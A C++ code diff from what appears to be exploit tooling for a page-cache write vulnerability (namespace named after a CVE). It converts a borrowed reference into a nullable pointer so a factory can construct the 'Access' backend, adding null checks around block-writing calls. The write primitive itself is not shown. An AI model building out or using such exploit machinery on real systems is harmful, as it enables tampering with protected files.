@@ -34,13 +34,23 @@ namespace ghostlock::backend::cve_2026_43284 {
 
         /** Blank: nothing is taken or decided here, as the ruling requires. The seam is borrowed
          *  and must outlive this object. */
-        explicit Access(seam::PageCacheSeam &seam) noexcept : seam_(seam) {}
+        // The retired form borrowed a reference, which cannot be default constructed.
+        // /** Blank: nothing is taken or decided here, as the ruling requires. The seam is borrowed
+        //  *  and must outlive this object. */
+        // explicit Access(seam::PageCacheSeam &seam) noexcept : seam_(seam) {}
+        //TODO(factory-reachability): the factory knows an id and nothing else, so the borrowed
+        //  reference becomes a nullable pointer. Delete the commented form above once the factory
+        //  and its tests pass, as the commenting rule requires.
+        Access() noexcept = default;
+        explicit Access(seam::PageCacheSeam *seam) noexcept : seam_(seam) {}
+        /** Hand over the seam a factory could not know. */
+        void adopt(seam::PageCacheSeam *seam) noexcept { seam_ = seam; }
 
         [[nodiscard]] AccessState state(AccessChannel channel) const noexcept override {
             if (channel != AccessChannel::PageCache) {
                 return AccessState::Unsupported;
             }
-            if (seam_.up()) {
+            if (seam_ != nullptr && seam_->up()) {
                 return AccessState::Ready;
             }
             return ever_up_ ? AccessState::Closed : AccessState::Declared;
@@ -61,7 +71,7 @@ namespace ghostlock::backend::cve_2026_43284 {
             if (params == nullptr || !params->usable_for_initialize()) {
                 return BoolResult::failed(AccessStatus::BadParameters);
             }
-            if (!seam_.bring_up_with(params->sa)) {
+            if (seam_ == nullptr || !seam_->bring_up_with(params->sa)) {
                 return BoolResult::failed(AccessStatus::Failed);
             }
             ever_up_ = true;
@@ -69,10 +79,11 @@ namespace ghostlock::backend::cve_2026_43284 {
         }
 
         [[nodiscard]] BoolResult shutdown() noexcept override {
-            if (!seam_.up()) {
+            if (seam_ == nullptr || !seam_->up()) {
                 return BoolResult::failed(AccessStatus::NotInitialized);
             }
-            return seam_.tear_down() ? BoolResult::ok(true) : BoolResult::failed(AccessStatus::Failed);
+            return (seam_ == nullptr || seam_->tear_down()) ? BoolResult::ok(true)
+                                                                : BoolResult::failed(AccessStatus::Failed);
         }
 
         /** Write one block. The bytes are the value; the position comes from the parameters. */
@@ -86,7 +97,7 @@ namespace ghostlock::backend::cve_2026_43284 {
             if (params == nullptr || !params->usable_for_access()) {
                 return CountResult::failed(AccessStatus::BadParameters);
             }
-            if (!seam_.up()) {
+            if (seam_ == nullptr || !seam_->up()) {
                 return CountResult::failed(AccessStatus::NotInitialized);
             }
             if (in.size() != seam::kWriteWidth) {
@@ -96,7 +107,7 @@ namespace ghostlock::backend::cve_2026_43284 {
             for (std::size_t i = 0U; i < seam::kWriteWidth; ++i) {
                 block[i] = std::to_integer<std::uint8_t>(in[i]);
             }
-            if (!seam_.land_block(params->offset, block)) {
+            if (seam_ == nullptr || !seam_->land_block(params->offset, block)) {
                 return CountResult::failed(AccessStatus::Failed);
             }
             return CountResult::ok(seam::kWriteWidth);
@@ -124,7 +135,10 @@ namespace ghostlock::backend::cve_2026_43284 {
             return static_cast<const AccessParams *>(&p);
         }
 
-        seam::PageCacheSeam &seam_;
+        // The retired member was a reference.
+        // seam::PageCacheSeam &seam_;
+        //TODO(factory-reachability): nullable, so a factory-built instance can exist.
+        seam::PageCacheSeam *seam_ = nullptr;
         /** Whether the route has ever been up, so a closed route is distinguishable from one that
          *  never came up. */
         bool ever_up_ = false;
